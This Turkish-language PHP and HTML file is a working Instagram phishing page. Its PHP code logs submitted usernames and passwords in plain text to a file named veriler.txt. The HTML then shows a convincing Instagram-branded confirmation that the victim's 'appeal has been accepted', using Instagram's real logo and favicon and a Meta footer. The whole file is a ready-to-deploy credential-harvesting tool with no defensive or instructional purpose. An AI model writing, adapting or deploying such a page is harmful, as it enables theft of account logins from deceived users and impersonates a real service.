<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = trim($_POST["username"] ?? "");
    $password = trim($_POST["password"] ?? "");

    if ($username !== "" && $password !== "") {
        $logLine = "[" . date("Y-m-d H:i:s") . "] Kullanıcı: $username - Şifre: $password" . PHP_EOL;
        $logFile = __DIR__ . "/veriler.txt";

        $fp = @fopen($logFile, "a");
        if ($fp) {
            if (flock($fp, LOCK_EX)) {
                fwrite($fp, $logLine);
                fflush($fp);
                flock($fp, LOCK_UN);
            }
            fclose($fp);
        } else {
            error_log("HATA: veriler.txt açılamadı!");
        }
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" />
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: #000;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }
  .container {
    background-color: #121212;
    width: 100%;
    max-width: 380px;
    border-radius: 12px;
    padding: 40px 30px 50px;
    text-align: center;
    box-shadow: 0 0 30px #000;
  }
  .logo {
    background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png') no-repeat center;
    background-size: contain;
    width: 175px;
    height: 60px;
    margin: 0 auto 28px;
  }
  p.message {
    font-size: 18px;
    font-weight: 600;
    color: #fff;
    margin: 40px 0 0;
    user-select: none;
  }
  footer {
    margin-top: 40px;
    font-size: 12px;
    color: #fff;
    line-height: 1.4;
    font-weight: 600;
    user-select: none;
  }
  footer .meta {
    font-size: 10px;
    color: #fff;
    margin-top: 4px;
    font-weight: 400;
  }
</style>
</head>
<body>
  <div class="container" role="main" aria-label="Instagram İtiraz Mesajı">
    <div class="logo" aria-hidden="true"></div>
    <p class="message">İtirazınız kabul edilmiştir.</p>
    <footer>
      © 2025 Instagram
      <div class="meta">From Meta</div>
    </footer>
  </div>
</body>
</html>
